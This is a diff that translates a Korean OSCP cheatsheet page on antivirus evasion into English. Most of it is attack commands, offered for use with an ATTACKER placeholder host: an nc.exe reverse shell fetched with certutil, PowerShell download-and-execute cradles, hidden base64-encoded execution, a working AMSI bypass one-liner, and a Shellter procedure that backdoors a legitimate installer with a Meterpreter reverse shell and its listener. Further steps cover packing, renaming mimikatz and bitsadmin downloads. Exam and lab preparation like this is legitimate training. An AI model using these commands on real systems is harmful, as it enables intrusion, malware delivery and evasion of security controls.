@@ -1,20 +1,20 @@
 ---
-title: "AV 우회 (AV Evasion)"
+title: "AV Evasion"
 date: 2026-06-20
 weight: 150
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "Defender가 페이로드를 막을 때 쓰는 백신 우회 기법 모음."
+summary: "Collection of antivirus evasion techniques for when Defender blocks your payload."
 ---
 
-OSCP 대상에서 백신을 우회하는 기법 모음. 자주 필요하진 않지만 Defender가 페이로드를 막을 때 구해준다.
+Techniques for evading antivirus on OSCP targets. Rarely needed, but they save you when Defender blocks a payload.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/av-evasion/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/av-evasion/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
 
-- 시험 규칙: 커스텀 스크립트와 수동 우회는 허용. 상용 도구(Cobalt Strike 등)는 금지.
+- Exam rules: Custom scripts and manual bypasses are allowed. Commercial tools (Cobalt Strike, etc.) are prohibited.
 
-## 빠른 의사결정 트리 (Quick Decision Tree)
+## Quick Decision Tree
 
 ```text
 Payload blocked by AV?
@@ -32,9 +32,9 @@ Payload blocked by AV?
   └── Try manual obfuscation (rename, recompile, modify strings)
 ```
 
-## 기법 1 — nc.exe 사용 (가장 간단, 먼저 시도)
+## Technique 1 — Use nc.exe (simplest, try first)
 
-nc.exe는 정상 네트워킹 도구라서 AV에 잘 걸리지 않는다.
+nc.exe is a legitimate networking tool, so AV rarely flags it.
 
 ```bash
 # Host it from Kali
@@ -48,9 +48,9 @@ certutil -urlcache -f http://ATTACKER/nc.exe C:\Windows\Temp\nc.exe
 C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe
 ```
 
-## 기법 2 — PowerShell 인메모리 실행 (디스크에 파일을 두지 않음)
+## Technique 2 — PowerShell in-memory execution (no file on disk)
 
-AV 파일 엔진은 디스크에 닿지 않은 것을 탐지하지 못한다. PowerShell 다운로드 크래들이 메모리에서 바로 실행한다.
+The AV file engine cannot detect what never touches disk. A PowerShell download cradle executes directly in memory.
 
 ```powershell
 # Download and execute script in memory (nothing written to disk)
@@ -60,7 +60,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
 powershell -nop -w hidden -e <BASE64_PAYLOAD>
 ```
 
-base64 페이로드 생성:
+Generate a base64 payload:
 
 ```bash
 # On Kali
@@ -69,18 +69,18 @@ cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0
 # Copy the output, use with: powershell -e <PASTE>
 ```
 
-### PowerShell AMSI 우회 (PowerShell 자체가 막혔을 때)
+### PowerShell AMSI bypass (when PowerShell itself is blocked)
 
-AMSI(Antimalware Scan Interface)는 실행 전에 PowerShell 명령을 검사한다. 우회:
+AMSI (Antimalware Scan Interface) inspects PowerShell commands before execution. Bypass:
 
 ```powershell
 # Simple AMSI bypass (may be patched — try variations)
 $a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
 ```
 
-## 기법 3 — Shellter (정상 PE에 페이로드 주입)
+## Technique 3 — Shellter (inject payload into a legit PE)
 
-Shellter는 정상 Windows 실행 파일에 쉘코드를 주입하면서 원래 기능을 유지한다.
+Shellter injects shellcode into a legitimate Windows executable while keeping its original functionality.
 
 ```bash
 # Install on Kali
@@ -95,26 +95,26 @@ sudo apt install wine32
 shellter
 ```
 
-절차:
+Procedure:
 
-1. `A` 선택 (Auto 모드)
-2. 정상 32비트 Windows .exe 지정 (아무 인스톨러나 다운로드)
-3. Stealth Mode 켜기 (페이로드 실행 후 원래 exe 동작을 복원)
-4. 페이로드 선택: `L` (listed) → `1` (Meterpreter reverse TCP)
-5. LHOST와 LPORT 설정
-6. 백도어가 심어진 exe를 대상으로 전송
+1. Choose `A` (Auto mode)
+2. Specify a legitimate 32-bit Windows .exe (download any installer)
+3. Enable Stealth Mode (restores the original exe behavior after the payload runs)
+4. Select payload: `L` (listed) → `1` (Meterpreter reverse TCP)
+5. Set LHOST and LPORT
+6. Send the backdoored exe to the target
 
 ```bash
 # Set up listener for Meterpreter
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST ATTACKER;set LPORT 443;run;"
 ```
 
-- 주의: Shellter는 32비트 PE만 지원. 캐리어는 32비트 인스톨러로 받는다.
-- 주의: VirusTotal에 업로드하지 않는다 — 샘플이 모든 AV 벤더에 공유된다.
+- Note: Shellter supports 32-bit PE only. Get the carrier as a 32-bit installer.
+- Note: Do not upload to VirusTotal — samples are shared with every AV vendor.
 
-## 기법 4 — 수동 난독화
+## Technique 4 — Manual obfuscation
 
-미리 만든 페이로드가 걸릴 때:
+When a prebuilt payload gets caught:
 
 ```bash
 # Recompile exploit from source (different compiler = different hash)
@@ -130,9 +130,9 @@ upx --best exploit.exe -o packed.exe
 cp mimikatz.exe notepad_helper.exe
 ```
 
-## 기법 5 — Living Off the Land (외부 도구 없음)
+## Technique 5 — Living Off the Land (no external tools)
 
-대상에 이미 있어서 AV가 걸지 않는 도구를 쓴다:
+Use tools already present on the target, which AV does not flag:
 
 ```powershell
 # PowerShell reverse shell (no external binary needed)
@@ -145,13 +145,13 @@ certutil -urlcache -f http://ATTACKER/file C:\Windows\Temp\file
 bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\Windows\Temp\file
 ```
 
-## AV가 문제가 아닐 때
+## When AV is not the problem
 
-OSCP 대상 대부분은 AV가 꺼져 있거나 최소화되어 있다. 페이로드가 안 되면:
+Most OSCP targets have AV disabled or minimized. If the payload fails:
 
-- 아키텍처 확인 (32 vs 64비트)
-- 방화벽 확인 (4444 대신 80/443 시도)
-- 페이로드를 로컬에서 먼저 검증
-- nc.exe 사용 — 거의 항상 된다
+- Check the architecture (32 vs 64 bit)
+- Check the firewall (try 80/443 instead of 4444)
+- Verify the payload locally first
+- Use nc.exe — it almost always works
 
-시험의 주제는 방법론이지 AV 우회가 아니다. nc.exe로 해결될 것을 우회에 몇 시간 쓰지 않는다.
+The exam is about methodology, not AV evasion. Do not spend hours on a bypass when nc.exe would solve it.
